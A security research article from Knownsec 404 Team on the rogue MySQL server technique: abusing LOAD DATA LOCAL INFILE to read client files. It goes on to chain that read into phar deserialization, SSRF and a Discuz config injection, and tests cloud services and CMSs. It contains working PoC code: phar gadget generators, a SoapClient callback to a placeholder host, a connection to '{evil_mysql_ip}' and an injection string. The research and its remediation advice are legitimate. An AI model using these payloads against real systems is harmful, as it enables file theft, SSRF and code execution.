**Author:LoRexxar@Knownsec 404Team & Dawu@Knownsec 404Team  
Chinese version: <https://paper.seebug.org/1112/> **

This may be a vulnerability that has been released a long time ago, but I saw
Dragon Sector and Cykor used it as a trick to get an unintendend solution for
the challenge h4x0r's club in the offline TCTF2018 final game.

<http://russiansecurity.expert/2016/04/20/mysql-connect-file-read/>

I then realized it was an interesting trick when I was having a discussion
with @Dawu. In the process of tracing this vulnerability, I discovered that
this has remained as a feature of mysql for many years, and has been shared
since 2013.

  * [Database Honeypot by design (2013 8月 Presentation from Yuri Goltsev)](https://www.slideshare.net/qqlan/database-honeypot-by-design-25195927)

  * [Rogue-MySql-Server Tool (2013年 9月 MySQL fake server to read files of connected clients)](https://github.com/Gifts/Rogue-MySql-Server)

  * [Abusing MySQL LOCAL INFILE to read client files (2018年4月23日)](https://w00tsec.blogspot.com/2018/04/abusing-mysql-local-infile-to-read.html)

In the process of digging, we are constantly discovering new ways to use it,
so most of these findings are summarized and prepared for sharing on the CSS.
Let us do the analysis step by step.

# Load Data Infile

Load data infile is a very special syntax. Friends who know about injection or
often play CTF may be familiar with this syntax. In CTF, we often encounter
situations where there is no way to load_file to read the file. At this time,
load data infile is the only possible way to read files. Generally our
statement is this:

    
    
    load data infile "/etc/passwd" into table test FIELDS TERMINATED BY '\n';

The mysql server will read the server's / etc / passwd and insert the data
into the table according to `'\n'`. But now this statement also requires you
to have FILE permissions, and non-local loaded statements are also restricted
by `secure_file_priv`.

    
    
    mysql> load data infile "/etc/passwd" into table test FIELDS TERMINATED BY '\n';
    
    ERROR 1290 (HY000): The MySQL server is running with the --secure-file-priv option so it cannot execute this statement

If we add a keyword local.

    
    
    mysql> load data local infile "/etc/passwd" into table test FIELDS TERMINATED BY '\n';
    Query OK, 11 rows affected, 11 warnings (0.01 sec)
    Records: 11  Deleted: 0  Skipped: 0  Warnings: 11

The client's file will be read and send to the server. The execution result of
the above statement is as follows.

![](https://images.seebug.org/content/images/2020/01/56129e00-b69b-4619-b21d-263fed9d67a6.png-w331s)

Obviously, this statement is not safe, and it is fully explained in the mysql
documentation.

<https://dev.mysql.com/doc/refman/8.0/en/load-data-local.html>

As mentioned in the mysql documentation, **clients should not connect to
untrusted servers**.

![](https://images.seebug.org/content/images/2020/01/b82d5b88-95e4-48cf-9a41-829d88749953.png-w331s)

And our analysis is based on this.

# Constructing A Malicious Server

After understanding the previous question, the question is about how do we
construct a malicious mysql server.

Before we figure this out, we need to study the packet structure that mysql
normally performs linking and querying.

1.Greeting package, the server returned the banner, which contains the version
of mysql

![](https://images.seebug.org/content/images/2020/01/dac99674-e3d9-426d-b2ac-b07503736c85.png-w331s)

2.Client login request

![](https://images.seebug.org/content/images/2020/01/337fe075-e145-414b-8d21-72446bbe4635.png-w331s)

3.Initializing query. There are a lot of queries because it is phpmyadmin.

![](https://images.seebug.org/content/images/2020/01/6d6652ec-d411-4d69-b57e-aaf7eb9cc2dc.png-w331s)

4.load file local

The statement is as follows

    
    
    load data local infile "C:/Windows/win.ini" into table test FIELDS TERMINATED BY '\n';

First the client sends the query

![](https://images.seebug.org/content/images/2020/01/16763e91-2625-4e1a-a084-1ba38991d5f7.png-w331s)

Then the server returned the required path.

![](https://images.seebug.org/content/images/2020/01/2c6bf164-6d7b-4041-a13a-a80d4182abbf.png-w331s)

Then the client sends the content directly to the server

![](https://images.seebug.org/content/images/2020/01/f3fbd803-0f88-447c-980d-b30c61482f94.png-w331s)

It seems very clear, and the path for the client to read the file is not
specified from the client but the server.

The original query process was

    
    
    Client: I want to insert win.ini into the test table
    Server: I want your win.ini content
    Client: The contents of win.ini are as follows ...

Suppose the server is controlled by us, and a normal process is tampered with
as follows

    
    
    Client: I want data in the test table
    Server: I want your win.ini content
    Client: The content of win.ini is as follows ???

Will the third sentence above be executed?

In [mysql documention](https://dev.mysql.com/doc/refman/8.0/en/load-data-local.html):

![](https://images.seebug.org/content/images/2020/01/2a534d27-7269-4e10-af13-95da75044a28.png-w331s)

**A patched server could in fact reply with a file-transfer request to any
statement**. This answers our question.

It is not difficult to find out the vulnerability is due to the configuration
problem of the MySQL client. After some research, I found that during the
MySQL login verification process, the client configuration will be sent.

![](https://images.seebug.org/content/images/2020/01/db0c3304-e4f4-4750-a145-8c0ced45d4dd.png-w331s)

After the greeting package, the client will connect and try to log in. At the
same time, there is a configuration in the data package about whether to allow
the use of load data local, from which we can see whether the client has this
problem (the returned configuration may not be always accurate, and this issue
will be mentioned later).

# PoC

After trying to understand the principle, it is not so difficult to build a
malicious server. The process is very simple.

1.Reply to the mysql client with a greeting package

2.Wait for the client to send a query packet

3.Reply to a file transfer package

The problem is all about constructing the package format. You can follow the
original text and various documents to complete the above several queries.

It is worth noting that the poc given by the original author did not adapt to
all situations. Some mysql clients will send ping packets after successful
login, and if there is no reply, they will disconnect. There are also some
mysql clients that have a strong check on the greeting package. It is
recommended to directly capture the package and construct it according to the
real package content.

  * <https://dev.mysql.com/doc/internals/en/connection-phase-packets.html#packet-Protocol::Handshake>

  * <https://dev.mysql.com/doc/internals/en/com-query-response.html>

poc given by the author.

<https://github.com/Gifts/Rogue-MySql-Server>

# Demo

I used a Tencent Cloud as the server, and phpmyadmin the client

![](https://images.seebug.org/content/images/2020/01/d9d1a69b-8e3e-47da-91eb-286936487a42.png-w331s)

![](https://images.seebug.org/content/images/2020/01/f86ddbcc-744a-47c8-8a7a-89bc3c6b36e2.png-w331s)

We successfully read the file.

# Sphere of influence

## Underlying Application

To know what impact the vulnerability woud bring, we must first know what kind
of clients are threatened by it.

  * mysql client (pwned)
  * php mysqli (pwned，fixed by 7.3.4)
  * php pdo (Disabled by default)
  * python MySQLdb (pwned)
  * python mysqlclient (pwned)
  * java JDBC Driver (pwned，Disabled by default in some conditions)
  * navicat （pwned)

## Probe

My first thought was the mysql probe, but unfortunately, after testing most of
the probes on the market, I found that most of the probes disconnected without
any query just after accepting the greeting package.

  * Yahei PHP Probe failed
  * iprober2 probe failed
  * One-click installation of PHP probe for LNMP failed
  * UPUPW PHP probe failed
  * ...

## Cloud Service Provider Cloud Database Data Migration Service

![](https://images.seebug.org/content/images/2020/02/838263fd-0d8b-4041-8f53-b9324fb9ef22.png-w331s)

All the above loopholes will be reported to the official in 2018 and the
loopholes principle will be observed

Domestic

  * Tencent Cloud DTS failed, Load data local disabled 
  * Alibaba Cloud RDS data migration failed, Load data local disabled 
  * Huawei Cloud RDS DRS Service succeeded 

![](https://images.seebug.org/content/images/2020/01/47f06b31-5d6a-4cea-a255-d3fcf5eecc1b.png-w331s)

![](https://images.seebug.org/content/images/2020/01/cef0b13a-a660-4c40-8a7e-99aa1abf1d45.png-w331s)

  * JD Cloud RDS does not support remote migration function, distributed relational database is not open 
  * UCloud RDS does not support remote migration function, and distributed relational databases cannot synchronize external data 
  * QiNiu Cloud RDS does not support remote migration function 
  * New Cloud RDS does not support remote migration function 
  * NetEase Cloud RDS external instance migration succeeded 

![](https://images.seebug.org/content/images/2020/01/1b9cf739-fc25-4389-a1b6-0b90b40022de.png-w331s)

  * Kingsoft Cloud RDS DTS data migration succeeded 

![](https://images.seebug.org/content/images/2020/01/1ad42f2f-a9df-4d42-99e2-3fbbcc698f2a.png-w331s)

![](https://images.seebug.org/content/images/2020/01/502935e8-8d63-4706-90bb-fa56c2f310f6.png-w331s)

  * Qingyun Cloud RDS data import failed, load data local disabled 
  * Baidu Cloud RDS DTS secceeded 

![](https://images.seebug.org/content/images/2020/01/60b9401d-b359-4391-8cb9-81601ca8527c.png-w331s)

International Cloud Service Provider

  * Google could SQL database migration failed, Load data infile disabled 
  * AWS RDS DMS Service succeeded 

![](https://images.seebug.org/content/images/2020/01/436ccfcc-0eb2-44cd-b5f1-87b65665226c.png-w331s)

![](https://images.seebug.org/content/images/2020/01/2818c06c-b62c-4372-a50d-9bcdbaf1dfb1.png-w331s)

## Excel Online Sql Query

As mentioned in a previous article, there is generally a function in Excel to
synchronize data from a database to a table so that the file can be read in
the above manner.

Inspired by this idea, we thought that we could find excel function of online
so that we could read arbitrary files.

  * WPS failed（Did not find it）
  * Microsoft excel failed (infile statement disabled)
  * Google Sheets (not natively, but supports plugins, the following mainly describes plugins)
    * Supermetrics pwned ![](https://images.seebug.org/content/images/2020/01/466c688e-5b03-4092-8840-d558e8d6e8b9.png-w331s)

![](https://images.seebug.org/content/images/2020/01/59d9c523-d80f-42cb-b83c-f5a44a989536.png-w331s)
\- Advanced CFO Solutions MySQL Query failed \- SeekWell failed \- Skyvia
Query Gallery failed \- database Borwser failed

![](https://images.seebug.org/content/images/2020/01/2b628029-06a9-4334-bc8f-38391aca9e5d.png-w331s)

# Expand? 2RCE!

Setting aside some of the very special situations we mentioned earlier, we
also need to discuss some of the exploit chain of this vulnerability in
general situations.

Since the discussion is about arbitrary file reading, the most direct thought
must be the vulnerability caused by the leakage of the configuration file.

## Leakage of arbitrary files reading with configuration file

There two files in the configuration of Discuz x3.4.

    
    
    config/config_ucenter.php
    config/config_global.php

In the back end of dz, there is a ucenter setting function. This function
provides ucenter's database server configuration. By configuring the database
to link to a malicious server, you can read any file to obtain configuration
information.

![](https://images.seebug.org/content/images/2020/01/d0ba0b04-3fe1-4cc1-9047-41975475832e.png-w331s)

Configure the access address of ucenter.

    
    
    Original address： http://localhost:8086/upload/uc_server
    Changed to： http://localhost:8086/upload/uc_server\');phpinfo();//

After we get the authkey, we can calculate the admin cookie by the admin's uid
and salt. Then use the admin cookie and `UC_KEY` to access it.

![](https://images.seebug.org/content/images/2020/01/d3f8f772-33cc-4fc1-9ac3-48da40454f82.png-w331s)

## Deserialization of arbitrary files reading to

File Operation Induced Unserialization via the “phar: //” Stream Wrapper topic
shared by Sam Thomas at the BlackHat 2018[https://i.blackhat.com/us-18/Thu-August-9/us-18-Thomas-Its-A-PHP-Unserialization-Vulnerability-Jim-But-Not-As-We-Know-It-wp.pdf ](https://i.blackhat.com/us-18/Thu-August-9/us-18-Thomas-Its-A-PHP-Unserialization-Vulnerability-Jim-But-Not-As-We-Know-It-wp.pdf).

It mentioned [Stream
API](https://secure.php.net/manual/zh/internals2.ze1.streams.php). The
corresponding pseudo-protocol can be registered by registering the extension,
and the phar extension registers the `phar: //` stream wrapper.

In the past research of Seaii from 404
Lab(<https://paper.seebug.org/680/>)shows that all file functions support
stream wrapper.

![](https://images.seebug.org/content/images/2020/01/3638c680-b81e-4162-a787-ecdb4e3c32f5.png-w331s)

We can find that the reason steam wrapper can be supported is because we
called

    
    
    stream = php_stream_open_wrapper_ex(filename, "rb" ....);

We return to the load file local statement of mysql. In mysqli, mysql reads
files through php functions

    
    
    https://github.com/php/php-src/blob/master/ext/mysqlnd/mysqlnd_loaddata.c#L43-L52
    
    if (PG(open_basedir)) {
            if (php_check_open_basedir_ex(filename, 0) == -1) {
                strcpy(info->error_msg, "open_basedir restriction in effect. Unable to open file");
                info->error_no = CR_UNKNOWN_ERROR;
                DBG_RETURN(1);
            }
        }
    
        info->filename = filename;
        info->fd = php_stream_open_wrapper_ex((char *)filename, "r", 0, NULL, context);

Which also called`php_stream_open_wrapper_ex`function. That is, we can also
trigger deserialization by reading a phar file.

### Recurrence

First we need to generate a phar

    
    
    pphar.php
    
    <?php
    class A {
        public $s = '';
        public function __wakeup () {
            echo "pwned!!";
        }
    }
    
    
    @unlink("phar.phar");
    $phar = new Phar("phar.phar"); //Suffix name must be phar
    $phar->startBuffering();
    $phar->setStub("GIF89a "."<?php __HALT_COMPILER(); ?>"); //set stub
    $o = new A();
    $phar->setMetadata($o); //store meta-data in manifest
    $phar->addFromString("test.txt", "test"); //Add Add files to compress
    // Automatic signature calculation
    $phar->stopBuffering();
    ?>

Use this file to generate a phar.phar

Then we simulate a query

    
    
    test.php
    
    <?php
    class A {
        public $s = '';
        public function __wakeup () {
            echo "pwned!!";
        }
    }
    
    
    $m = mysqli_init();
    mysqli_options($m, MYSQLI_OPT_LOCAL_INFILE, true);
    $s = mysqli_real_connect($m, '{evil_mysql_ip}', 'root', '123456', 'test', 3667);
    $p = mysqli_query($m, 'select 1;');
    
    // file_get_contents('phar://./phar.phar');

In the figure, we only did the select 1 query, but our fake evil mysql server
drove the mysql client to do a `load file local` query and read the local

    
    
    phar://./phar.phar

and triggered deserialization

![](https://images.seebug.org/content/images/2020/01/2ef6899c-6d65-43ee-8c67-2e83513eabce.png-w331s)

## Deserialize to RCE

When a deserialization vulnerability appears, we need to find the appropriate
pop chain from the source code. Based on the use of the pop chain, we can
further expand the harm of the deserialization vulnerability.

Common magic methods in php serialization are the following \- Called when the
object is created: **construct \- Called when the object is destroyed:**
destruct \- Called when the object is used as a string: **toString \- Call
this method before serializing the object (the return needs to be an array):**
sleep \- Call this method before deserializing the recovery object: **wakeup
\- This method is automatically called when a method that does not exist in
the calling object:** call

With the corresponding pop chain, we can convert deserialization into RCE.

### dedecms Background Deserialization Vulnerability to SSRF

dedecms background, module management, install UCenter module. Start
configuration.

![](https://images.seebug.org/content/images/2020/01/0004a967-96cc-40a1-8cec-5f64f59a683c.png-w331s)

First, you need to find a certain UCenter server. You can find a dz station as
the server.

![](https://images.seebug.org/content/images/2020/01/d548acca-6422-4ae1-a81b-9b4996c41372.png-w331s)

Then any file read will be triggered. Of course, if the read file is phar,
deserialization will be triggered.

We need to generate the corresponding phar first

    
    
    <?php
    
    class Control
    {
        var $tpl;
        // $a = new SoapClient(null,array('uri'=>'http://example.com:5555', 'location'=>'http://example.com:5555/aaa'));
        public $dsql;
    
        function __construct(){
            $this->dsql = new SoapClient(null,array('uri'=>'http://xxxx:5555', 'location'=>'http://xxxx:5555/aaa'));
        }
    
        function __destruct() {
            unset($this->tpl);
            $this->dsql->Close(TRUE);
        }
    }
    
    @unlink("dedecms.phar");
    $phar = new Phar("dedecms.phar");
    $phar->startBuffering();
    $phar->setStub("GIF89a"."<?php __HALT_COMPILER(); ?>"); //Set stub, add gif file header
    $o = new Control();
    $phar->setMetadata($o); //Save custom meta-data to manifest
    $phar->addFromString("test.txt", "test"); // Add files to be compressed
    // Automatic signature calculation
    $phar->stopBuffering();
    
    ?>

Then we can upload the avatar through the front end or using api from the back
end. And then rogue mysql server to read this file

    
    
    phar://./dedecms.phar/test.txt

Monitor 5555 can receive

![](https://images.seebug.org/content/images/2020/01/bbf958b2-09c4-4f20-89e4-357e2785419b.png-w331s)

ssrf can further attack surfaces such as redis.

## Part of CMS Test Results

name | impacted version | if mysql arbitrary file reading exists | if MySQL
server configuration controllable | controllable deserialization | upload phar
| patches  
---|---|---|---|---|---|---  
phpmyadmin | < 4.8.5 | Yes | Yes | Yes | Yes |
[Patch](https://github.com/phpmyadmin/phpmyadmin/commit/828f740158e7bf14aa4a7473c5968d06364e03a2)  
Dz | Not patched | Yes | Yes | No | None | None  
drupal | None | No(use PDO) | No(install) | Yes | Yes | None  
dedecms | None | Yes | Yes(ucenter) | Yes(ssrf) | Yes | None  
ecshop | None | Yes | Yes | No | Yes | None  
Zen Tao | None | No(PDO) | No | None | None | None  
phpcms | None | Yes | Yes | Yes(ssrf) | Yes | None  
Empire cms | None | Yes | Yes | No | None | None  
phpwind | None | No(PDO) | Yes | None | None | None  
mediawiki | None | Yes | No（did not find ways to change mysql configuration in
the back end） | Yes | Yes | None  
Z-Blog | None | Yes | No（did not find ways to change mysql configuration in
the back end） | Yes | Yes | None  
  
# Repair method

For most mysql clients, load file local is a useless statement mostly used to
transfer or upload data. For the client, you can directly turn off this
function without affecting normal use.

See the specific closing method

  * <https://dev.mysql.com/doc/refman/8.0/en/load-data-local.html>

For different servers, this configuration has different methods. For JDBC,
this configuration is called `allowLoadLocalInfile`

  * <https://dev.mysql.com/doc/connector-j/5.1/en/connector-j-reference-configuration-properties.html>

In php's mysqli and mysql link modes, the underlying code directly determines
this configuration.

![](https://images.seebug.org/content/images/2020/01/e951435c-435e-4eba-9228-516d29418816.png-w331s)

This configuration is `PHP_INI_SYSTEM`. In the php documentation, this
configuration means`Entry can be set in php.ini or httpd.conf`.

So it can only be fixed by modifying `mysqli.allow_local_infile = Off` in
php.ini.

In the php7.3.4 update, this configuration in mysqli has also been modified to
turn off by default.

<https://github.com/php/php-src/commit/2eaabf06fc5a62104ecb597830b2852d71b0a111#diff-904fc143c31bb7dba64d1f37ce14a0f5>

![](https://images.seebug.org/content/images/2020/01/d9dec462-7022-4cc9-aab0-92d89eabb106.png-w331s)

Unfortunately, in the old version mysql5.6, which is no longer updated, both
mysql and mysqli are enabled by default.

In recent versions, you can configure this option before linking via
`mysqli_option` .

<http://php.net/manual/zh/mysqli.options.php>

![](https://images.seebug.org/content/images/2020/01/8477c50f-a047-4a6e-a514-a7d50f575fb0.png-w331s)

What is more interesting is that in this way, although `allow_local_infile` is
disabled, if you use wireshark to capture packets, you find
that`allow_local_infile` is still enabled (but invalid).

In the old version of phpmyadmin, `mysqli_real_connect` was executed first,
then`mysql_option` was set, so that `allow_local_infile` was actually
disabled, but`allow_local_infile` was not disabled when the link request was
initiated.

Actually, when `mysqli_real_connect` is executed, it will
initialize`allow_local_infile`. At the bottom of the PHP code,
`mysqli_real_connect` actually executes`mysqli_common_connect`. In the code of
`mysqli_common_connect`,`allow_local_infile` is set once.

<https://github.com/php/php-src/blob/ca8e2abb8e21b65a762815504d1fb3f20b7b45bc/ext/mysqli/mysqli_nonapi.c#L251>

![](https://images.seebug.org/content/images/2020/01/b5e49c16-820d-4825-b971-84bdc75aff7a.png-w331s)

If `mysql_option` is set before`mysqli_real_connect`, its `allow_local_infile`
configuration will be overwritten and its modification will be invalid.

phpmyadmin also fixed the vulnerability on January 22 by exchanging the
relative positions of the two functions.
<https://github.com/phpmyadmin/phpmyadmin/commit/c5e01f84ad48c5c626001cb92d7a95500920a900#diff-cd5e76ab4a78468a1016435eed49f79f>

# Summary

This is an attack mode against the mysql feature. At present, it cannot be
repaired at the mysql level. The impression can only be avoided if the
configuration is closed on the client. Although it is not very extensive as an
attack surface, it may be particularly effective in converting a normal
function into an arbitrary file for special situations, which is very
effective in expanding the attack surface.

The detailed attack situation is not assumed here, since the it could lead to
huge impact.

# References

  * <http://russiansecurity.expert/2016/04/20/mysql-connect-file-read/>
  * <https://lightless.me/archives/read-mysql-client-file.html>
  * <https://dev.mysql.com/doc/refman/8.0/en/load-data.html>
  * <https://dev.mysql.com/doc/refman/8.0/en/load-data.html>

* * *

![Paper](https://images.seebug.org/content/images/2017/08/0e69b04c-e31f-4884-8091-24ec334fbd7e.jpeg)
本文由 Seebug Paper 发布，如需转载请注明来源。本文地址：<https://paper.seebug.org/1113/>

